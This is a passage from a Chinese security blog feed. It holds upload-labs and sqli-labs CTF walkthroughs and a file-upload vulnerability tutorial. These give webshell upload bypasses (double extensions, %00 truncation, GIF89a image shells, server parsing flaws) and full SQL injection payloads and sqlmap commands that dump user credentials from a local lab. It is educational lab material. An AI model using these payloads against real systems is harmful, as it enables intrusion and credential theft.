punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是会删除文件结尾的点。和第七题一样的方法就可以绕过。</p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是这个函数str_ireplace<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>会把后缀替换为空</p><p>双写绕过<code>.pphphp</code></p><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 %00截断"></a>Pass-11 %00截断</h2><p>在保存路径设置自定义文件名及其后缀</p><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h2><p>和上面一样，就是换了请求方式，由于不会像GET那样自动解码，可以用010editor把0加进去</p><h2 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13 图片马"></a>Pass-13 图片马</h2><p>提示只检查开头两个字节</p><p>文件头加个GIF89a</p><h2 id="Pass-14-图片马"><a href="#Pass-14-图片马" class="headerlink" title="Pass-14 图片马"></a>Pass-14 图片马</h2><p>用了getimagesize()检查是否为图片文件</p><p>制作一个图片马就行了</p><h2 id="Pass-15-图片马"><a href="#Pass-15-图片马" class="headerlink" title="Pass-15 图片马"></a>Pass-15 图片马</h2><p>用exif_imagetype()检查是否为图片文件</p><p>还是直接图片马</p><h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16 二次渲染"></a>Pass-16 二次渲染</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="2020/lou-dong/wen-jian-shang-chuan-lou-dong/"/>
      <url>2020/lou-dong/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p><h2 id="常见文件上传检测"><a href="#常见文件上传检测" class="headerlink" title="常见文件上传检测"></a>常见文件上传检测</h2><h3 id="1-客户端js检查"><a href="#1-客户端js检查" class="headerlink" title="1.客户端js检查"></a>1.客户端js检查</h3><p>js代码中加了拓展名的黑名单限制，防止一般用户上传不被允许的文件。</p><p>绕过方式：</p><p>1.burpsuite抓包修改</p><p>2.前端修改js代码</p><p>3.禁用浏览器js</p><h3 id="2-服务端检测绕过"><a href="#2-服务端检测绕过" class="headerlink" title="2.服务端检测绕过"></a>2.服务端检测绕过</h3><h4 id="MIME-类型检测"><a href="#MIME-类型检测" class="headerlink" title="MIME 类型检测"></a>MIME 类型检测</h4><p>主要是检测Content-Type: 字段</p><p>就是检查Content-Type的值，MIME类型决定了某种扩展名用什么应用程序打开，GIF的MIME值为image/gif</p><p>绕过方式：</p><p>burp抓包修改Content-Type: 为允许的字段<br>Content-Type: image/gif<br>Content-Type: image/png<br>Content-Type: image/jpeg</p><h4 id="文件拓展名检查"><a href="#文件拓展名检查" class="headerlink" title="文件拓展名检查"></a>文件拓展名检查</h4><p>与前端js后缀名检测类似，只不过是在后端进行检查，有时候还可以配合解析漏洞结合目录路径攻击，例如test.asp/test.jpg。后端后缀名检查也分两种，黑名单与白名单。</p><p>黑名单检查绕过：</p><ul><li>文件名大小写绕过，例代码中有php规则，那么可以使用PHP或pHP绕过。</li><li>黑名单列表绕过，对黑名单列表中没有的扩展名进行攻击，比如asa、cer等。</li><li>利用windows和Linux系统的特性进行特殊文件名绕过，a.asp. a.asp_等。</li><li>htaccess 文件攻击。</li><li>配合解析漏洞(IIS、Apache等)。</li></ul><p>白名单绕过：</p><ul><li>截断攻击，比如a.asp%00.gif等。</li><li>配合解析漏洞。</li></ul><h4 id="目录路径的检查"><a href="#目录路径的检查" class="headerlink" title="目录路径的检查"></a>目录路径的检查</h4><p>对目录路径可进行0x00截断绕过；以及可以控制目录地址，上传文件夹的参数可控)</p><h4 id="检测文件内容是否包含恶意代码"><a href="#检测文件内容是否包含恶意代码" class="headerlink" title="检测文件内容是否包含恶意代码"></a>检测文件内容是否包含恶意代码</h4><p>这种方式主要检查图片文件的幻数，比如GIF的值为GIF89a，后端代码会检测改值判断是否为GIF图片文件，想要绕过只要在幻数后面加上一句话木马就行。</p><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p><strong>iis解析漏洞</strong><br>1 目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。<br>2 文件解析<br>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。<br>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx<br>3 默认解析<br>.asp .aspx .ashx .asa .cer这是系统默默认的后缀名<br><strong>Apache解析漏洞</strong><br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断。比如xxx.php.rar对apache来说rar是不可解析的，所以就会解析成xxx.php</p><p><strong>nginx解析漏洞</strong><br>开启cgi:SCRIPT_NAME FASTCGI:<br><a href="http://www.xx.com/a.jpg/.php(%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6)-----%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E4%B8%BA.php%E6%96%87%E4%BB%B6">www.xx.com/a.jpg/.php(任何不存在文件)-----可以解析为.php文件</a><br>a.jpg:<?php phpinfo();?><br>a.php%00.jpg—-解析为a.php</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="2020/ba-chang/sqli-labs/"/>
      <url>2020/ba-chang/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>手动</strong></p><p>先判断注入类型。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 2 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194701808.png" alt="image-20210208194701808"></p><p>显示位是2,3。所以可以在 2,3位置进行sql注入</p><p>这里涉及到几个函数</p><p><a href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p><pre class="line-numbers language-none"><code class="language-none">爆库:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,database() --+爆表:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+爆字段:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+爆值:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194722570.png" alt="image-20210208194722570"></p><p><strong>sqlmap</strong></p><p>为了方便截图,后面加个输出参数为0</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql –batch –v 0sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql --dbs --batch -v 0 #查有哪些模式sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql -D security --tables  --batch -v 0 #查表sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql -D security -T users --columns  --batch -v 0 #查字段sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194906554.png" alt="image-20210208194906554"></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>手动</strong></p><p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和less1一样</p><p><strong>sqlmap</strong></p><p>套less1的语句就行</p><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>手动</strong></p><p>先传id=1 好家伙</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194806106.png" alt="image-20210208194806106"></p><p>要构造闭合,上一篇slq注入的文章写过</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 1&#x3D;1 --+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来的和上面一样操作</p><p> <strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个还是可以</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194824485.png" alt="image-20210208194824485"></p><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195001271.png" alt="image-20210208195001271"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-4&#x2F;?id&#x3D;1&quot;和上面的类似,只需要闭合&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和上面的操作一样</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-4&#x2F;?id&#x3D;1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195017876.png" alt="image-20210208195017876"></p><p><strong>手动</strong></p><p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left((select database()),2)&#x3D;&quot;se&quot; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200311822.png" alt="image-20210208200311822"></p><p>后面的就和前面差不多了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195053128.png" alt="image-20210208195053128"></p><pre class="line-numbers language-none"><code class="language-none">查看security数据库的表python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195747622.png" alt="image-20210208195747622"></p><pre class="line-numbers language-none"><code class="language-none">查看字段python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195649270.png" alt="image-20210208195649270"></p><pre class="line-numbers language-none"><code class="language-none">查看用户名和密码 python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195813166.png" alt="image-20210208195813166"></p><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p><p>先确定是如何闭合的，如下</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7?id&#x3D;1&#39;)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195934527.png" alt="image-20210208195934527"></p><p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p><p><strong>sqlmap</strong></p><p>布尔盲注直接跑</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>手动</strong></p><p>这题也是布尔盲注，payload和第五题差不多，可以用left函数或ASCII函数来一个一个来判断，还是用sqlmap舒服🤣</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>时间注入</p><p><strong>手动</strong></p><p>又是一个一个去试，可以采用ASCII函数采用二分法来找到正确的字符，然后配合sleep(5)函数来构造</p><p><strong>sqlmap</strong></p><p>把technique改成T来试试</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>手动</strong></p><p>还是时间注入,只是和上一题的拼接方式不一样</p><p>先构造闭合，试了一下下面几个，马上就显示you are in了，说明没有被执行</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&#39; and sleep(5)--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&#39;) and sleep(5)--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&#39;)) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终正确的闭合是</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就和上题less9一样操作了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195951851.png" alt="image-20210208195951851"></p><p>从这以后就全部变成post注入了</p><p><strong>手动</strong></p><pre class="line-numbers language-none"><code class="language-none">username部分username&#x3D;admin&#39; union select 1,database()# 把username换成admin,后面的操作就和第一题差不多了username&#x3D;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#username&#x3D;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;#username&#x3D;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#password可以随便输,因为后台已经注释掉了SELECT username, password FROM users WHERE username&#x3D;&#39;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200012353.png" alt="image-20210208200012353"></p><p><strong>sqlmap</strong></p><p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200030999.png" alt="image-20210208200030999"></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-11&#x2F; --data &quot;uname&#x3D;admin &amp;passwd&#x3D;admin &amp;submit&#x3D;Submit&quot; --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p><h2 id="less13"><a href="#less13" class="headerlink" 